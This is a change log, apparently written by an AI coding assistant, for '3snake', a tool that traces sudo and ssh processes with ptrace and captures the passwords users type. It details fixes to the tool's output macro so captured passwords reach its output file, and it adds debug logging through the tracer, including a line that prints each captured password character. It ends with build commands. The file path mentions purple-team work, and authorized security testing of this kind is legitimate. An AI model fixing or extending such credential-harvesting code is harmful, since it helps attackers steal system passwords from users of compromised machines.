# Code Changes - Before and After Comparison

## Change 1: Output Macro Fix (CRITICAL)

**File**: `src/helpers.h`

### BEFORE
```c
#define output(x...) { \
fprintf(stderr, "[%s] %d %d %s\t", process_username, (int)time(0), process_pid, process_name);\
fprintf(stderr, x);\
}\
```

### AFTER
```c
#define output(x...) { \
fprintf(stdout, "[%s] %d %d %s\t", process_username, (int)time(0), process_pid, process_name);\
fprintf(stdout, x);\
fflush(stdout);\
}\
```

### Why This Fixes It
- **stderr → stdout**: When daemonized with `-d -o file`, stdout is redirected to the output file. The original code wrote to stderr.
- **Added fflush()**: Ensures output is immediately written and not buffered in memory.

---

## Change 2: Process Event Logging

**File**: `src/plisten.c` - `handle_proc_ev()` function

### Key Additions
```c
debug("[DEBUG] handle_proc_ev: Event type=%d, pid=%d\n", 
      nlcn_msg.proc_ev.what, nlcn_msg.proc_ev.event_data.id.process_pid);

switch (nlcn_msg.proc_ev.what) {
  case PROC_EVENT_EXEC:
    debug("[DEBUG] PROC_EVENT_EXEC detected, pid=%d\n", ...);
    // ... existing code ...
    break;
  case PROC_EVENT_UID:
    debug("[DEBUG] PROC_EVENT_UID detected, pid=%d\n", ...);
    // ... existing code ...
    break;
  default:
    debug("[DEBUG] handle_proc_ev: Unhandled event type %d\n", ...);
    break;
}
```

### Purpose
Shows when and which process events are detected.

---

## Change 3: Process Validation Logging

**File**: `src/tracers.c` - `validate_process_name()` function

### Key Additions
```c
debug("[DEBUG] validate_process_name: Checking process_name='%s'\n", process_name);

if (ENABLE_SSH && strncmp(process_name, P_SSH_NET, strlen(P_SSH_NET)) == 0) {
  debug("[DEBUG] validate_process_name: Matched SSH_NET\n");
  return ssh_tracer;
}

// ... more pattern checks with debug output ...

debug("[DEBUG] validate_process_name: No match found\n");
return invalid_tracer;
```

### Purpose
Shows which process is being checked and whether it matches expected patterns.

---

## Change 4: Path Validation Logging

**File**: `src/tracers.c` - `validate_process_path()` function

### Key Additions
```c
debug("[DEBUG] validate_process_path: Checking path='%s'\n", process_path);

for (i = 0; i < CONFIG_PROCESS_PATHS; i++) {
  config_path = config_valid_process_paths[i];
  slen = strlen(config_path);

  debug("[DEBUG] validate_process_path: Comparing with '%s'\n", config_path);
  if (strncmp(process_path, config_path, slen) == 0) {
    debug("[DEBUG] validate_process_path: Path matched!\n");
    return 1;
  }
}

debug("[DEBUG] validate_process_path: No path match found\n");
return 0;
```

### Purpose
Shows if the binary path is whitelisted.

---

## Change 5: Process Tracing Pipeline Logging

**File**: `src/tracers.c` - `trace_process()` function

### Key Additions
```c
void trace_process(pid_t traced_process) {
  enum tracer_types type = invalid_tracer;

  process_name = get_proc_name(traced_process);
  process_path = get_proc_path(traced_process);
  process_pid = traced_process;

  debug("[DEBUG] trace_process: pid=%d, name=%s, path=%s\n", 
        traced_process, process_name ? process_name : "NULL", 
        process_path ? process_path : "NULL");

  if (!process_name || !process_path) {
    debug("[DEBUG] trace_process: Missing name or path, returning\n");
    return;
  }

  type = validate_process_name();
  debug("[DEBUG] trace_process: validate_process_name returned type=%d\n", type);

  if (!process_name || !type || !process_path) {
    debug("[DEBUG] trace_process: Type validation failed, returning\n");
    return;
  }

  if (!validate_process_path()) {
    debug("[DEBUG] trace_process: Path validation failed for %s\n", process_path);
    return;
  }

  debug("[DEBUG] trace_process: All validations passed, calling tracer type=%d\n", type);

  process_username = get_proc_username(traced_process);

  if (tracers[type] != NULL)
    tracers[type](traced_process);
}
```

### Purpose
Shows the complete validation pipeline and which step (if any) fails.

---

## Change 6: Sudo Tracer Logging

**File**: `src/sudo_tracer.c` - `intercept_sudo()` function

### Key Additions
```c
void intercept_sudo(pid_t traced_process) {
  // ... initialization ...
  
  debug("[SUDO] intercept_sudo called for pid=%d\n", traced_process);

  // ... allocation ...

  debug("[SUDO] Attempting PTRACE_ATTACH to pid=%d\n", traced_process);
  ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status)) {
    debug("[SUDO] Process not stopped after attach! status=%d\n", status);
    goto exit_sudo;
  }

  debug("[SUDO] Process attached successfully\n");
  
  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    syscall = get_syscall(traced_process);
    debug("[SUDO] Syscall: %d\n", syscall);

    // ... syscall handling ...

    if (syscall == SYSCALL_read) {
      // ... password capture ...
      
      if (read_string[0] && i < MAX_PASSWORD_LEN) {
        password[i++] = read_string[0];
        debug("[SUDO] Got char: %c\n", read_string[0]);
      } else {
        if (i && strnascii(password, i)) {
          debug("[SUDO] Output password attempt\n");
          output("%s\n", password);  // Now writes to stdout!
        }
        // ... reset ...
      }
    }
  }

  debug("[SUDO] Exiting sudo tracer\n");
  // ... cleanup ...
}
```

### Purpose
Shows ptrace operations, syscall tracing, and when passwords are captured.

---

## Summary of Changes

| Type | File | What | Why |
|------|------|------|-----|
| **CRITICAL** | helpers.h | `fprintf(stderr` → `fprintf(stdout` | Output goes to correct stream |
| **CRITICAL** | helpers.h | Added `fflush(stdout)` | Prevents buffering issues |
| DEBUG | plisten.c | Added event detection logging | See if events are firing |
| DEBUG | tracers.c | Added name validation logging | See why processes don't match |
| DEBUG | tracers.c | Added path validation logging | See why paths don't validate |
| DEBUG | tracers.c | Added full pipeline logging | Understand execution flow |
| DEBUG | sudo_tracer.c | Added ptrace and syscall logging | Debug tracing issues |

---

## Impact Analysis

### Without These Changes
❌ Output written to wrong stream (stderr instead of stdout)
❌ No way to debug what's happening
❌ Silent failures give no information
❌ User sees no output and can't understand why

### With These Changes
✅ Output written to correct stream (stdout)
✅ Extensive debug logging shows what's happening
✅ Can identify exactly where issues occur
✅ User can verify functionality and troubleshoot

---

## Build Commands

```bash
# Clean and rebuild
cd /home/dj/PurpleTeam/3snake/3snake
make clean
make

# Verify binary was created
ls -lah ./3snake
file ./3snake
```

The changes compile cleanly with no warnings or errors (using existing Makefile).
